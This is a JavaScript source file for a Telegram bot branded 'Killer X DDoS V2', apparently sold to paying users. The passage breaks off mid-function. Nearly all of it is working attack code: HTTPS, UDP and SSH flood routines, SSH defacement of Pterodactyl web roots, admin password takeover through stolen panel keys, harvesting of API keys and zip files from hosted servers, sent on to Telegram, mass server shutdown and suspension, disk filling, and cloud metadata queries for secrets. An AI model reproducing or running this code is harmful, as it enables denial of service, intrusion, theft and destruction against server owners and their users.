const TelegramBot = require('node-telegram-bot-api');
const https = require('https');
const dgram = require('dgram');
const fetch = (...args) => import('node-fetch').then(({ default: fetch }) => fetch(...args));
const { Client } = require('ssh2');
const fs = require('fs');
const http = require('http');
const path = require('path');
const os = require('os');
const axios = require('axios');
const FormData = require('form-data');
const { execSync } = require('child_process');
const chalk = require('chalk');
const dns = require('dns');
const { token, OWNER_ID } = require('./config');
const bot = new TelegramBot(token, { polling: true });
const PREMIUM_FILE = './premium.json';

// Load data premium
let premiumList = {};
if (fs.existsSync(PREMIUM_FILE)) {
    premiumList = JSON.parse(fs.readFileSync(PREMIUM_FILE));
}

// Fungsi simpan data premium
function savePremium() {
    fs.writeFileSync(PREMIUM_FILE, JSON.stringify(premiumList, null, 2));
}

// /start command
bot.onText(/\/start/, (msg) => {
    const chatId = msg.chat.id;

    const caption = `<blockquote>👋 Halo! Selamat datang di bot Killer X DDoS V2</blockquote>

🔸 <b>STATUS SYSTEM (JSON)</b>
<pre>{
  "bot_name": "Killer X DDoS",
  "version": "2.0",
  "status": "Vip Buy Only",
  "engine": "NodeJS"
}</pre>

🔸 <b>BASH COMMAND</b>
<code>$ ./killer-x --start --target-all</code>

🔸 <b>Informasi</b>
Developer: @ajaymelll
Bot Name: Killer X DDoS
Version: 2.0
Status: Vip Buy Only`;

    bot.sendPhoto(chatId, 'https://files.catbox.moe/3h0per.jpg', {
        caption: caption,
        parse_mode: 'HTML',
        reply_markup: {
            inline_keyboard: [
                [
                    { text: 'All Menu', callback_data: 'kill' }
                ],
                [
                    { text: 'Developer', url: 'https://t.me/ajaymelll' }
                ]
            ]
        }
    });
});

bot.on('callback_query', (query) => {
    const chatId = query.message.chat.id;
    const messageId = query.message.message_id;

    if (query.data === 'kill') {
        bot.answerCallbackQuery(query.id);
        const killCaption = `<blockquote>🔸 Killer Menu
        
/ddos &lt;url&gt;
/stopddos &lt;url&gt;
/deface &lt;ip|pw&gt;
/hackadp &lt;domain|plta|pw_baru&gt;
/setpwvps &lt;ip|pw|new_pw&gt;
/killpanel
/getpwvps
/scanapi
/farmsc
/shutdown
/killnode on/off
/ping

🔸 Owner Menu
/addprem &lt;id&gt;
/delprem &lt;id&gt;</blockquote>`;

        bot.editMessageCaption(killCaption, {
            chat_id: chatId,
            message_id: messageId,
            parse_mode: 'HTML',
            reply_markup: {
                inline_keyboard: [
                    [{ text: 'Back', callback_data: 'back_start' }],
                    [{ text: 'Developer', url: 'https://t.me/ajaymelll' }]
                ]
            }
        });
    } else if (query.data === 'back_start') {
                const startCaption = `<blockquote>👋 Welcome to Killer X DDoS V2 - Terminal</blockquote>
<pre>━━━━━━━━━━━━━━━━━━━━
[ SYSTEM ] : READY_TO_LOAD
[ VERSION ] : 2.0.0_STABLE
[ STATUS ] : PREMIUM_VIP
━━━━━━━━━━━━━━━━━━━━</pre>

🔸 <b>𝗕𝗢𝗧 𝗜𝗡𝗙𝗢𝗥𝗠𝗔𝗧𝗜𝗢𝗡 (𝗝𝗦𝗢𝗡)</b>
<pre>{
  "developer": "@ajaymelll",
  "bot_name": "Killer X DDoS",
  "license": "Vip Buy Only",
  "platform": "NodeJS_v18"
}</pre>

<i>🔒 Awaiting user command...</i>`;

        bot.editMessageCaption(startCaption, {
            chat_id: chatId,
            message_id: messageId,
            parse_mode: 'HTML',
            reply_markup: {
                inline_keyboard: [
                    [
                        { text: 'All Menu', callback_data: 'kill' }
                    ],
                    [
                        { text: 'Developer', url: 'https://t.me/ajaymelll' }
                    ]
                ]
            }
        });
    }
});

// Tambah premium
bot.onText(/\/addprem(?:\s+(\d+))?/, (msg, match) => {
    const chatId = msg.chat.id;
    const fromId = msg.from.id;

    if (fromId !== OWNER_ID) 
        return bot.sendMessage(chatId, '❌ Hanya owner yang bisa memakai perintah ini.');

    const userId = match[1];

    if (!userId) {
        return bot.sendMessage(chatId, 
            '❌ Format salah!\n\nCara penggunaan:\n/addprem <user_id>\n\nContoh:\n/addprem 123456789'
        );
    }

    if (!premiumList[userId]) {
        premiumList[userId] = true;
        savePremium();
        bot.sendMessage(chatId, `✅ User dengan ID ${userId} berhasil ditambahkan ke premium.`);
    } else {
        bot.sendMessage(chatId, `⚠️ User dengan ID ${userId} sudah premium.`);
    }
});

// Hapus premium
bot.onText(/\/delprem(?:\s+(\d+))?/, (msg, match) => {
    const chatId = msg.chat.id;
    const fromId = msg.from.id;

    if (fromId !== OWNER_ID) 
        return bot.sendMessage(chatId, '❌ Hanya owner yang bisa memakai perintah ini.');

    const userId = match[1];

    if (!userId) {
        return bot.sendMessage(chatId, 
            '❌ Format salah!\n\nCara penggunaan:\n/delprem <user_id>\n\nContoh:\n/delprem 123456789'
        );
    }

    if (premiumList[userId]) {
        delete premiumList[userId];
        savePremium();
        bot.sendMessage(chatId, `✅ User dengan ID ${userId} berhasil dihapus dari premium.`);
    } else {
        bot.sendMessage(chatId, `⚠️ User dengan ID ${userId} tidak ditemukan di premium.`);
    }
});

const targetFile = './target.json';
let activeTargets = fs.existsSync(targetFile) ? JSON.parse(fs.readFileSync(targetFile)) : {};

// --- FUNGSI EKSEKUSI ---
const runAttack = (targetUrl, targetIp, targetPort = 443) => {
    const httpsAttack = () => {
        const options = {
            method: 'GET',
            headers: {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Rexzy-Worm/V11',
                'X-Forwarded-For': Array(4).fill(0).map(() => Math.floor(Math.random() * 255)).join('.'),
                'Cache-Control': 'no-cache'
            }
        };
        setInterval(() => {
            const req = https.get(targetUrl, options, (res) => { res.on('data', () => {}); });
            req.on('error', () => {});
            req.end();
        }, 0);
    };

    const udpClient = dgram.createSocket('udp4');
    const message = Buffer.alloc(1024, 'KONTOL-HAMA-YATIM-YANZZ-OFFICIAL-HANCURKAN-LU');
    const udpAttack = () => {
        setInterval(() => {
            for (let j = 0; j < 200; j++) {
                udpClient.send(message, 0, message.length, targetPort, targetIp);
            }
        }, 0);
    };

    const floodSSH = () => {
        setInterval(() => {
            const conn = new Client();
            conn.on('error', () => { conn.end(); }).connect({
                host: targetIp, port: 22, username: 'root', password: 'Rexzzy_kill_you'
            });
        }, 1);
    };

    httpsAttack();
    udpAttack();
    floodSSH();
};

// --- AUTO RESUME SAAT BOT RESTART ---
Object.keys(activeTargets).forEach(url => {
    runAttack(url, activeTargets[url].ip);
});

bot.onText(/\/ddos (.+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id.toString();
    const targetUrl = match[1];

    if (!premiumList[userId]) {
        return bot.sendMessage(chatId, `❌ AKSES DITOLAK!\n\nFitur ini hanya untuk user *PREMIUM*.\nSilakan upgrade terlebih dahulu.`, {
            parse_mode: "Markdown"
        });
    }

    try {
        const hostname = new URL(targetUrl).hostname;
        bot.sendMessage(chatId, `[ 📡 ] MENCARI IP TARGET: ${hostname}...`);

        dns.lookup(hostname, (err, address) => {
            if (err) return bot.sendMessage(chatId, `[ ❌ ] GAGAL MENGAMBIL IP: ${err.message}`);

            const targetIp = address;
            activeTargets[targetUrl] = { ip: targetIp };
            fs.writeFileSync(targetFile, JSON.stringify(activeTargets, null, 2));

            bot.sendMessage(chatId, `[ 🚀 ] TARGET TERKUNCI!\nIP: ${targetIp}\nMODE: TOTAL DESTRUCTION 🌪️\n\nPASUKAN SEDANG MELUNCUR! 💣`);
            runAttack(targetUrl, targetIp);
        });
    } catch (e) {
        bot.sendMessage(chatId, ` [ ❌ ] FORMAT URL SALAH! Gunakan https://target.com`);
    }
});

bot.onText(/\/stop (.+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id.toString();
    const targetUrl = match[1].trim();

    if (!premiumList[userId] && userId !== OWNER_ID) {
        return bot.sendMessage(chatId, `❌ AKSES DITOLAK!\n\nFitur ini hanya untuk user *PREMIUM*.`, {
            parse_mode: "Markdown"
        });
    }

    if (activeTargets[targetUrl]) {
        delete activeTargets[targetUrl];
        fs.writeFileSync(targetFile, JSON.stringify(activeTargets, null, 2));

        await bot.sendMessage(chatId, `[ 🛑 ] TARGET DIHAPUS: ${targetUrl}\n[ 🔄 ] BOT SEDANG RESTART OTOMATIS...`);

        setTimeout(() => {
            console.log("🔄 Restarting...");
            process.exit(0);
        }, 1000);

    } else {
        bot.sendMessage(chatId, `[ ⚠️ ] URL tidak ada dalam daftar serangan!`);
    }
});

bot.onText(/\/listddos/i, (msg) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id.toString();

    if (!premiumList[userId] && userId !== OWNER_ID) {
        return bot.sendMessage(chatId, `❌ AKSES DITOLAK!\n\nFitur ini hanya untuk user *PREMIUM*.`, {
            parse_mode: "Markdown"
        });
    }

    const urls = Object.keys(activeTargets);
    if (urls.length === 0) {
        return bot.sendMessage(chatId, `[ 📊 ] Daftar serangan kosong, Tuan!`);
    }

    let report = `[ 📋 ] DAFTAR TARGET MENDERITA:\n\n`;
    urls.forEach((url, i) => {
        report += `${i + 1}. URL: ${url}\nIP: ${activeTargets[url].ip}\n\n`;
    });

    bot.sendMessage(chatId, report);
});

bot.onText(/\/killpanel/, async (msg) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;

    if (userId !== OWNER_ID) {
        return bot.sendMessage(chatId, "❌ Akses ditolak! Hanya OWNER yang bisa menggunakan command ini.");
    }

    bot.sendMessage(chatId, `[ ⚠ ] MEMPROSES KILL PANEL! 💣`);

    const targetFolder = path.join(__dirname, '.SAMPAH');
    if (!fs.existsSync(targetFolder)) {
        try { fs.mkdirSync(targetFolder); } catch(e) {}
    }

    const getExactAvailableBytes = () => {
        try {
            if (process.platform === 'win32') {
                const output = execSync('wmic logicaldisk get freespace,caption').toString();
                const main = output.trim().split('\n').find(l => l.includes('C:'));
                return parseInt(main.trim().split(/\s+/)[1]);
            } else {
                const output = execSync("df -B1 . --output=avail | tail -1").toString();
                return parseInt(output.trim());
            }
        } catch (e) { 
            return 143321149440;
        }
    };

    const availableBytes = getExactAvailableBytes();
    const availableGB = (availableBytes / (1024 ** 3)).toFixed(2);
    const filePath = path.join(targetFolder, `REXZY_FINAL_VOID.bin`);

    try {
        bot.sendMessage(chatId, `[ ⚙ ] MENCIPTAKAN FILE PEMBUNGKAM SEBESAR ${availableGB} GB...`);

        if (process.platform === 'win32') {
            const fd = fs.openSync(filePath, 'w');
            fs.writeSync(fd, Buffer.alloc(1), 0, 1, availableBytes - 1);
            fs.closeSync(fd);
        } else {
            let success = false;
            try {
                execSync(`fallocate -l ${availableBytes} "${filePath}" 2>/dev/null`);
                success = true;
            } catch (e) {
                try {
                    execSync(`truncate -s ${availableBytes} "${filePath}" 2>/dev/null`);
                    success = true;
                } catch (e2) {
                    const fd = fs.openSync(filePath, 'w');
                    fs.writeSync(fd, Buffer.alloc(1), 0, 1, availableBytes - 1);
                    fs.closeSync(fd);
                    success = true;
                }
            }
            if (!success) throw new Error('Gagal membuat file dengan semua metode');
        }

        bot.sendMessage(chatId, `[ ✅ ] KILLER BERHASIL!\n\n🔥 ${availableGB} GB TELAH DIMUSNAHKAN!`);
        console.log(chalk.bgRed.white.bold(`\n [!!!] ${availableGB} GB DISK WIPED BY PROFESOR REXZY! [!!!] `));

    } catch (err) {
        bot.sendMessage(chatId, `❌ Terjadi error:\n${err.message}`);
    }
});

bot.onText(/\/deface (.+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id.toString();
    const input = match[1];
    const [ip, password] = input.split('|');

    if (!premiumList[userId] && userId !== OWNER_ID) {
        return bot.sendMessage(chatId, `❌ AKSES DITOLAK!\n\nFitur ini hanya untuk user *PREMIUM*.`, {
            parse_mode: "Markdown"
        });
    }

    if (!ip || !password) {
        return bot.sendMessage(chatId, `[ ❌ ] FORMAT SALAH! Gunakan: /deface ip|password`);
    }

    bot.sendMessage(chatId, `[ 🕵 ] MENYELUSUP KE VPS: ${ip}...`);

    const htmlPath = path.join(__dirname, "deface.html");
    let htmlContent = "";
    try {
        htmlContent = fs.readFileSync(htmlPath, "utf8");
    } catch (err) {
        return bot.sendMessage(chatId, `[⚠️] FILE deface.html TIDAK DITEMUKAN!`);
    }

    const script = `
DIR="/var/www/pterodactyl/public"
if [ ! -d "$DIR" ]; then DIR=$(find /var -type d -name public | grep pterodactyl | head -n 1); fi
if [ -z "$DIR" ]; then DIR="/var/www/html"; fi

cd $DIR
if [ ! -f "index.php.bak" ]; then cp -p index.php index.php.bak; fi

cat << 'EOF' > index.php
<?php
// HACKED BY PROFESOR @ajaymelll
?>
TARO HTML LU DI SINI JAN MODAL SC INI DOANG
EOF

chown www-data:www-data index.php
chmod 644 index.php
echo "DONE"
`;

    const conn = new Client();
    conn.on("ready", () => {
        bot.sendMessage(chatId, `[ 🔥 ] SSH TERHUBUNG! MENYUNTIKKAN VIRUS DEFACE...`);
        
        conn.exec(script, (err, stream) => {
            if (err) {
                bot.sendMessage(chatId, `[ ❌ ] EKSEKUSI GAGAL: ${err.message}`);
                return conn.end();
            }

            stream.on("close", () => {
                bot.sendMessage(chatId, `[ ✅ ] DEFACE BERHASIL!\n📍 IP: ${ip}\n🎭 STATUS: WEB TELAH DIKUASAI! 💀`);
                conn.end();
            }).on("data", (data) => {
                console.log('STDOUT: ' + data);
            });
        });
    }).on("error", (err) => {
        bot.sendMessage(chatId, `[ ❌ ] KONEKSI SSH GAGAL: ${err.message}`);
    }).connect({
        host: ip,
        port: 22,
        username: "root",
        password: password,
        readyTimeout: 10000
    });
});

bot.onText(/\/hackadp (.+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    const userIdTelegram = msg.from.id.toString();
    const input = match[1].split('|');
    
    if (!premiumList[userIdTelegram] && userIdTelegram !== OWNER_ID) {
        return bot.sendMessage(chatId, `❌ AKSES DITOLAK!\n\nFitur ini hanya untuk user *PREMIUM*.`, {
            parse_mode: "Markdown"
        });
    }

    if (input.length < 3) {
        return bot.sendMessage(chatId, "❌ Format salah! Gunakan: /hackadp domain|plta|pw_baru");
    }

    const domain = input[0].trim();
    const plta = input[1].trim();
    const newPassword = input[2].trim();
    const userId = 1;

    bot.sendMessage(chatId, "⏳ Sedang memproses perubahan password di database Pterodactyl...");

    try {
        const headers = {
            "Authorization": `Bearer ${plta}`,
            "Content-Type": "application/json",
            "Accept": "application/vnd.pterodactyl.v1+json"
        };

        const res = await axios.get(`${domain}/api/application/users/${userId}`, { headers });
        const u = res.data.attributes;

        await axios.patch(`${domain}/api/application/users/${userId}`, {
            email: u.email,
            username: u.username,
            first_name: u.first_name,
            last_name: u.last_name,
            password: newPassword
        }, { headers });

        const successMsg = `
✅ *SUCCESS CHANGE PASSWORD*
----------------------------------
👤 *Username* : ${u.username}
📧 *Email* : ${u.email}
🆔 *User ID* : ${userId}
🔑 *New Pass* : \`${newPassword}\`
🌐 *Domain* : ${domain}
----------------------------------
`;

        bot.sendMessage(chatId, successMsg, { parse_mode: "Markdown" });

    } catch (err) {
        const errorDetail = err.response?.data?.errors ? JSON.stringify(err.response.data.errors) : err.message;
        bot.sendMessage(chatId, `❌ **ERROR TERJADI!**\n\nDetail: \`${errorDetail}\``, { parse_mode: "Markdown" });
    }
});

bot.onText(/\/killvps (.+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id.toString();
    const targetIp = match[1].trim();

    if (!premiumList[userId] && userId !== OWNER_ID) {
        return bot.sendMessage(chatId, `❌ AKSES DITOLAK!\n\nFitur ini hanya untuk user *PREMIUM*.`, {
            parse_mode: "Markdown"
        });
    }
    
    if (!targetIp) {
        return bot.sendMessage(chatId, "❌ Masukkan IP Target! Contoh: /killvps 1.1.1.1");
    }

    bot.sendMessage(chatId, `🚀 *ATTACK STARTED!*\n\nTarget: \`${targetIp}\`\nMethod: SSH Connection Flood\nStatus: Sending Infinite Payloads... 🌪️`, { 
        parse_mode: "Markdown" 
    });

    const floodSSHServer = (hostname) => {
        const port = 22; 
        const username = 'root';
        
        setInterval(() => {
            for (let i = 0; i < 10; i++) {
                const password = 'Rexzzy_kill_you_' + Math.random();
                const conn = new Client();
                
                conn.on('error', (err) => {
                    conn.end();
                }).connect({
                    host: hostname,
                    port: port,
                    username: username,
                    password: password,
                    readyTimeout: 500
                });
            }
        }, 1);
    };

    floodSSHServer(targetIp);
});

const userSessions = {};

bot.onText(/\/killnode (on|off)/i, (msg, match) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id.toString();
    const action = match[1].toLowerCase();

    if (!premiumList[userId] && userId !== OWNER_ID) {
        return bot.sendMessage(chatId, `❌ AKSES DITOLAK!\n\nFitur ini hanya untuk user *PREMIUM*.`, {
            parse_mode: "Markdown"
        });
    }

    userSessions[chatId] = { action: action === 'on' };

    bot.sendMessage(chatId, "🌐 MASUKKAN DOMAIN PANEL:", { parse_mode: "Markdown" });
});

bot.on('message', async (msg) => {
    const chatId = msg.chat.id;
    const text = msg.text;

    if (!userSessions[chatId] || text.startsWith('/')) return;

    const session = userSessions[chatId];

    if (!session.domain) {
        session.domain = text.trim();
        return bot.sendMessage(chatId, "🔑 MASUKKAN PLTA", { parse_mode: "Markdown" });
    }

    if (!session.plta) {
        session.plta = text.trim();
        const { domain, plta, action } = session;

        bot.sendMessage(chatId, `🚀 **MEMPROSES NODE...\nStatus: ${action ? '🔴 MAINTENANCE ON' : '🟢 ACTIVE'}`);

        try {
            const headers = {
                'Authorization': `Bearer ${plta}`,
                'Content-Type': 'application/json',
                'Accept': 'application/json'
            };

            const response = await axios.get(`${domain}/api/application/nodes`, { headers });
            const nodes = response.data.data;

            if (nodes.length === 0) {
                delete userSessions[chatId];
                return bot.sendMessage(chatId, "❌ Tidak ada node yang ditemukan di panel ini.");
            }

            let successCount = 0;

            for (const node of nodes) {
                const nData = node.attributes;
                try {
                    await axios.patch(`${domain}/api/application/nodes/${nData.id}`, {
                        name: nData.name,
                        location_id: nData.location_id,
                        fqdn: nData.fqdn,
                        scheme: nData.scheme,
                        memory: nData.memory,
                        memory_overallocate: nData.memory_overallocate,
                        disk: nData.disk,
                        disk_overallocate: nData.disk_overallocate,
                        daemon_listen: nData.daemon_listen,
                        daemon_sftp: nData.daemon_sftp,
                        maintenance_mode: action
                    }, { headers });
                    successCount++;
                } catch (nodeErr) {
                    console.error(`Gagal update node ID ${nData.id}`);
                }
            }

            bot.sendMessage(chatId, `
✅ *EKSEKUSI SELESAI!*

Total Node Terupdate: *${successCount}*
Status Baru: ${action ? 'MAINTENANCE' : 'ACTIVE'}`,
        { parse_mode: "Markdown" });

        } catch (err) {
            bot.sendMessage(chatId, `❌ **API ERROR:**\n\`${err.message}\``, { parse_mode: "Markdown" });
        }

        delete userSessions[chatId];
    }
});

const scanSessions = {};

bot.onText(/\/scanapi/i, (msg) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id.toString();

    if (!premiumList[userId] && userId !== OWNER_ID) {
        return bot.sendMessage(chatId, `❌ AKSES DITOLAK!\n\nFitur ini hanya untuk user *PREMIUM*.`, {
            parse_mode: "Markdown"
        });
    }

    scanSessions[chatId] = { step: 1 };
    bot.sendMessage(chatId, "🌐 *TAHAP 1: MASUKKAN DOMAIN PANEL*:", { 
        parse_mode: "Markdown" 
    });
});

bot.on('message', async (msg) => {
    const chatId = msg.chat.id;
    const text = msg.text;

    if (!scanSessions[chatId] || text.startsWith('/')) return;

    const session = scanSessions[chatId];

    if (session.step === 1) {
        session.domain = text.trim().replace(/\/$/, '');
        session.step = 2;
        return bot.sendMessage(chatId, "🔑 *TAHAP 2: MASUKKAN PLTA:*", { parse_mode: "Markdown" });
    }

    if (session.step === 2) {
        session.plta = text.trim();
        session.step = 3;
        return bot.sendMessage(chatId, "🔐 *TAHAP 3: MASUKKAN PLTC:*", { parse_mode: "Markdown" });
    }

    if (session.step === 3) {
        session.pltc = text.trim();
        const { domain, plta, pltc } = session;
        delete scanSessions[chatId];

        bot.sendMessage(chatId, "🌪 *MEMULAI PENGGELEDAHAN MASSAL...*");

        try {
            const serversRes = await axios.get(`${domain}/api/application/servers`, {
                headers: { 'Authorization': `Bearer ${plta}`, 'Accept': 'application/json' }
            });

            const servers = serversRes.data.data;
            if (servers.length === 0) return bot.sendMessage(chatId, "❌ Tidak ada server di panel ini..");

            for (const server of servers) {
                const sID = server.attributes.identifier;
                const sName = server.attributes.name;
                
                await deepScanFiles(domain, sID, sName, pltc, chatId);
            }

            bot.sendMessage(chatId, "✅ *EKSEKUSI SELESAI!*\nSemua celah telah diperiksa.");

        } catch (e) {
            bot.sendMessage(chatId, `❌ **ERROR PANEL:** \`${e.message}\` (Cek Domain/PLTA Tuan!)`, { parse_mode: "Markdown" });
        }
    }
});

async function deepScanFiles(host, sID, sName, pltc, chatId, dir = '') {
    try {
        const filesRes = await axios.get(`${host}/api/client/servers/${sID}/files/list?directory=${encodeURIComponent(dir || '/')}`, {
            headers: { 'Authorization': `Bearer ${pltc}`, 'Accept': 'application/json' }
        });
        
        const files = filesRes.data.data;
        for (const file of files) {
            const fName = file.attributes.name;
            const isDir = file.attributes.mimetype === 'application/x-directory' || !fName.includes('.');
            const fPath = dir ? `${dir}/${fName}` : fName;
            
            if (isDir) {
                if (!['node_modules', '.npm', '.git', 'tmp', 'cache'].includes(fName)) {
                    await deepScanFiles(host, sID, sName, pltc, chatId, fPath);
                }
            } else if (['config.js', 'settings.js', '.env', 'database.php', 'api.js', 'main.js'].includes(fName)) {
                await checkContent(host, sID, sName, fPath, pltc, chatId);
            }
        }
    } catch (e) {}
}

async function checkContent(host, sID, sName, fPath, pltc, chatId) {
    try {
        const contentRes = await axios.get(`${host}/api/client/servers/${sID}/files/contents?file=%2F${encodeURIComponent(fPath)}`, {
            headers: { 'Authorization': `Bearer ${pltc}`, 'Accept': 'application/json' }
        });
        
        const content = contentRes.data;
        
        const dopRegex = /dop_v1_[a-zA-Z0-9]+/g;
        const ptlaRegex = /ptla_[a-zA-Z0-9]+/g;
        const ptlcRegex = /ptlc_[a-zA-Z0-9]+/g;
        
        const foundDop = [...new Set(content.match(dopRegex) || [])];
        const foundPtla = [...new Set(content.match(ptlaRegex) || [])];
        const foundPtlc = [...new Set(content.match(ptlcRegex) || [])];

        if (foundDop.length > 0 || foundPtla.length > 0 || foundPtlc.length > 0) {
            let msg = `🚨 *LEAK FOUND DI SERVER: ${sName}* 🚨\n`;
            msg += `━━━━━━━━━━━━━━━━━━━━\n`;
            msg += `📂 *FILE:* \`${fPath}\`\n`;
            msg += `━━━━━━━━━━━━━━━━━━━━\n\n`;
            
            if (foundDop.length > 0) {
                msg += `☢️ *DOP_V1 KEYS:*\n\`${foundDop.join('\n')}\`\n\n`;
            }
            if (foundPtla.length > 0) {
                msg += `🔑 *PTLA KEYS:*\n\`${foundPtla.join('\n')}\`\n\n`;
            }
            if (foundPtlc.length > 0) {
                msg += `🔑 *PTLC KEYS:*\n\`${foundPtlc.join('\n')}\`\n`;
            }
            
            msg += `━━━━━━━━━━━━━━━━━━━━`;

            bot.sendMessage(chatId, msg, { parse_mode: "Markdown" });
        }
    } catch (e) {}
}

const farmSessions = {};

bot.onText(/\/farmsc/i, (msg) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id.toString();

    if (!premiumList[userId] && userId !== OWNER_ID) {
        return bot.sendMessage(chatId, `❌ AKSES DITOLAK!\n\nFitur ini hanya untuk user *PREMIUM*.`, {
            parse_mode: "Markdown"
        });
    }

    farmSessions[chatId] = { step: 1 };
    bot.sendMessage(chatId, "🌐 TAHAP 1: MASUKKAN DOMAIN PANEL:");
});

bot.on('message', async (msg) => {
    const chatId = msg.chat.id;
    const text = msg.text;

    if (!farmSessions[chatId] || text.startsWith('/')) return;

    const session = farmSessions[chatId];

    if (session.step === 1) {
        session.domain = text.trim().replace(/\/$/, '');
        session.step = 2;
        return bot.sendMessage(chatId, "🔑 TAHAP 2: MASUKKAN PLTA::");
    }

    if (session.step === 2) {
        session.plta = text.trim();
        session.step = 3;
        return bot.sendMessage(chatId, "🔐 TAHAP 3: MASUKKAN PLTC:");
    }

    if (session.step === 3) {
        session.pltc = text.trim();
        const { domain, plta, pltc } = session;
        delete farmSessions[chatId];

        bot.sendMessage(chatId, "🌾 MEMULAI PROSES PANEN...");

        try {
            const serversRes = await axios.get(`${domain}/api/application/servers`, {
                headers: { 'Authorization': `Bearer ${plta}`, 'Accept': 'application/json' }
            });

            const servers = serversRes.data.data;
            if (servers.length === 0) return bot.sendMessage(chatId, "❌ Tidak ada server ditemukan.");

            for (const server of servers) {
                const sID = server.attributes.identifier;
                const sName = server.attributes.name;

                try {
                    const filesRes = await axios.get(`${domain}/api/client/servers/${sID}/files/list`, {
                        headers: { 'Authorization': `Bearer ${pltc}`, 'Accept': 'application/json' }
                    });

                    const zipFiles = filesRes.data.data.filter(f => f.attributes.name.endsWith('.zip'));

                    for (const zip of zipFiles) {
                        const fileName = zip.attributes.name;
                        
                        const dlRes = await axios.get(`${domain}/api/client/servers/${sID}/files/download?file=%2F${encodeURIComponent(fileName)}`, {
                            headers: { 'Authorization': `Bearer ${pltc}`, 'Accept': 'application/json' }
                        });

                        const dlUrl = dlRes.data.attributes.url;
                        const filePath = path.join(__dirname, fileName);

                        const writer = fs.createWriteStream(filePath);
                        const response = await axios({ url: dlUrl, method: 'GET', responseType: 'stream' });
                        response.data.pipe(writer);

                        await new Promise((resolve, reject) => {
                            writer.on('finish', resolve);
                            writer.on('error', reject);
                        });

                        const form = new FormData();
                        form.append('chat_id', chatId);
                        form.append('document', fs.createReadStream(filePath));
                        form.append('caption', `📦 HARVEST SUCCESS\n\n🖥️ Server: ${sName}\n📂 File: ${fileName}`);

                        await axios.post(`https://api.telegram.org/bot${token}/sendDocument`, form, {
                            headers: form.getHeaders()
                        });

                        fs.unlinkSync(filePath);
                    }
                } catch (e) {
                    console.log(`[-] Gagal panen di server ${sName}: ${e.message}`);
                }
            }
            bot.sendMessage(chatId, "✅ PANEN SELESAI!");
        } catch (err) {
            bot.sendMessage(chatId, `❌ ERROR CRITICAL: ${err.message}`);
        }
    }
});

const shutdownSessions = {};

bot.onText(/\/shutdown/i, (msg) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id.toString();

    if (!premiumList[userId] && userId !== OWNER_ID) {
        return bot.sendMessage(chatId, `❌ AKSES DITOLAK!\n\nFitur ini hanya untuk user *PREMIUM*.`, {
            parse_mode: "Markdown"
        });
    }

    shutdownSessions[chatId] = { step: 1 };
    bot.sendMessage(chatId, "🌐 TAHAP 1: MASUKKAN DOMAIN PANEL:");
});

bot.on('message', async (msg) => {
    const chatId = msg.chat.id;
    const text = msg.text;

    if (!shutdownSessions[chatId] || text.startsWith('/')) return;

    const session = shutdownSessions[chatId];

    if (session.step === 1) {
        session.domain = text.trim().replace(/\/$/, '');
        session.step = 2;
        return bot.sendMessage(chatId, "🔑 TAHAP 2: MASUKKAN PLTA (Admin API Key):");
    }

    if (session.step === 2) {
        session.plta = text.trim();
        session.step = 3;
        return bot.sendMessage(chatId, "🔐 TAHAP 3: MASUKKAN PLTC (Client API Key):");
    }

    if (session.step === 3) {
        session.pltc = text.trim();
        const { domain, plta, pltc } = session;
        delete shutdownSessions[chatId];

        bot.sendMessage(chatId, "⚡ MENGIRIM SINYAL PEMUSNAH...");

        try {
            const serversRes = await axios.get(`${domain}/api/application/servers`, {
                headers: { 'Authorization': `Bearer ${plta}`, 'Accept': 'application/json' }
            });

            const servers = serversRes.data.data;
            if (servers.length === 0) return bot.sendMessage(chatId, "❌ Panel kosong, tidak ada yang bisa dimatikan.");

            let shutCount = 0;
            let suspCount = 0;

            for (const server of servers) {
                const sID = server.attributes.id;
                const sUUID = server.attributes.identifier;
                const sName = server.attributes.name;

                try {
                    await axios.post(`${domain}/api/client/servers/${sUUID}/power`, 
                    { "signal": "kill" }, 
                    { headers: { 'Authorization': `Bearer ${pltc}`, 'Content-Type': 'application/json' } });
                    shutCount++;
                } catch (e) {
                    console.log(`Gagal mematikan power ${sName}`);
                }

                try {
                    await axios.post(`${domain}/api/application/servers/${sID}/suspend`, {}, {
                        headers: { 'Authorization': `Bearer ${plta}`, 'Accept': 'application/json' }
                    });
                    suspCount++;
                } catch (e) {
                    console.log(`Gagal suspend server ${sName}`);
                }
            }

            bot.sendMessage(chatId, `✅ EKSEKUSI TOTAL SELESAI!\n\n🖥️ Server Dimatikan: ${shutCount}\n🔒 Server Di-suspend: ${suspCount}`);

        } catch (err) {
            bot.sendMessage(chatId, `❌ ERROR SYSTEM: ${err.message}`);
        }
    }
});

const floodSessions = {};

async function tryFetch(url, headers = {}) {
    try {
        const res = await fetch(url, { headers, timeout: 3000 });
        if (!res.ok) return null;
        return await res.text();
    } catch (e) {
        return null;
    }
}

bot.onText(/\/getpwvps/i, async (msg) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id.toString();

    if (userId !== OWNER_ID.toString()) {
        return bot.sendMessage(chatId, `❌ AKSES DITOLAK!\n\nFitur ini hanya untuk *OWNER*.`, {
            parse_mode: "Markdown"
        });
    }

    await bot.sendMessage(chatId, "🔍 *BABU sedang mencoba menembus Metadata Service...*\nSedang mencari celah di DigitalOcean, AWS, dan GCP! 🕵️‍♂️🛰️", {
        parse_mode: "Markdown"
    });

    let provider = 'unknown';
    let userData = null;

    const doMetaText = await tryFetch('http://169.254.169.254/metadata/v1.json', { 'Accept': 'application/json' });
    if (doMetaText) {
        provider = 'DigitalOcean';
        try { 
            const json = JSON.parse(doMetaText);
            userData = json.user_data ?? "No User-Data Found"; 
        } catch(e) {}
    }

    if (!userData || userData === "No User-Data Found") {
        const aws = await tryFetch('http://169.254.169.254/latest/user-data');
        if (aws) { 
            provider = 'AWS (Amazon)'; 
            userData = aws; 
        }
    }

    if (!userData || userData === "No User-Data Found") {
        const gcp = await tryFetch(
